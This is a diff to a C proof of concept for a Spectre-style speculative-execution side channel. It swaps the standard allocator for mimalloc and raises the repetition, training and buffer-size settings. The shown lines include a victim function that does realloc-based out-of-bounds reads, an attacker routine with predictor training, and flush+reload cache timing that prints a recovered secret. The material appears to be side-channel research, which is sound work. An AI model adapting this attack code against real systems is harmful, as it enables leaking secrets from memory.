@@ -12,7 +12,7 @@
 #include <x86intrin.h>
 #include <errno.h>
 #include <sys/resource.h>
-#include "mimalloc-main/include/mimalloc.h"
+#include <mimalloc.h>
 
 #define PAGE_SIZE 4096
 #define NUM_PAGES 256
@@ -33,7 +33,7 @@ volatile uint32_t array_size = 8;
 
 
 char* secret_init(){
-    char* array = malloc(32);
+    char* array = mi_malloc(32);
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
@@ -43,7 +43,7 @@ char* secret_init(){
 }
 
 uint8_t* array_init(){
-    uint8_t* array = malloc(array_size);
+    uint8_t* array = mi_malloc(array_size);
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
@@ -67,9 +67,9 @@ char random_char(){
 
 
 
-#define REP 1 // Number of repetitions to de-noise the channel
-#define TRAINING_EPOCH 4 // 15 in-bound accesses then 1 out-of-bound access
-#define BUF_SIZE 1
+#define REP 100 // Number of repetitions to de-noise the channel
+#define TRAINING_EPOCH 64 // 15 in-bound accesses then 1 out-of-bound access
+#define BUF_SIZE 19
 
 
 #define CACHE_LINE_SIZE 64
@@ -117,7 +117,7 @@ void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
 
 uint64_t calibrate_latency() {
     uint64_t hit = 0, miss = 0, threshold, rep = 1000;
-    uint8_t *data = malloc(8);
+    uint8_t *data = mi_malloc(8);
     assert(data); // Lazy "exception" handling
 
     // Measure cache hit latency
@@ -142,16 +142,16 @@ uint64_t calibrate_latency() {
     printf("Avg. hit latency: %" PRIu64 ", Avg. miss latency: %" PRIu64
            ", Threshold: %" PRIu64 "\n",
            hit, miss, threshold);
-    free(data);
+    mi_free(data);
     return threshold;
 }
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t new_size) {
     // if (new_size <= array_size && new_size >= (array_size / 2) && new_size > 0) {
-    //     *array = realloc(*array, new_size);
+    //     *array = mi_realloc(*array, new_size);
     // }
 
-    *array = realloc(*array, new_size);
+    *array = mi_realloc(*array, new_size);
 
     index &= array_index_mask_nospec(index, new_size);
     uint8_t secret = (*array)[index];
@@ -193,10 +193,10 @@ void attacker_function() {
     size_t safe_index = array_size/2; //An in-bound index
     size_t malicious_size = (size_t)(malicious_index+1);
 
-    uint8_t *otherArray = malloc(malicious_size * sizeof(uint8_t));
+    uint8_t *otherArray = mi_malloc(malicious_size * sizeof(uint8_t));
     char known_value = random_char();
     otherArray_init(malicious_size * sizeof(uint8_t), malicious_index, known_value, otherArray);
-    free(otherArray);
+    mi_free(otherArray);
     // printf("Other Array addr: %p\n", otherArray);
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
@@ -240,7 +240,7 @@ void attacker_function() {
                 }
             }
             otherArray_init(malicious_size, malicious_index, known_value, array);
-            free(array);
+            mi_free(array);
             array = array_init();
             known_value = random_char();
         }
@@ -251,8 +251,8 @@ void attacker_function() {
     }
     printf("Recovered secret: \"%s\"\n", buf);
     munmap(pages, PAGE_SIZE * SYMBOL_CNT);
-    free(array);
-    free(secret);
+    mi_free(array);
+    mi_free(secret);
     return;
 }
 
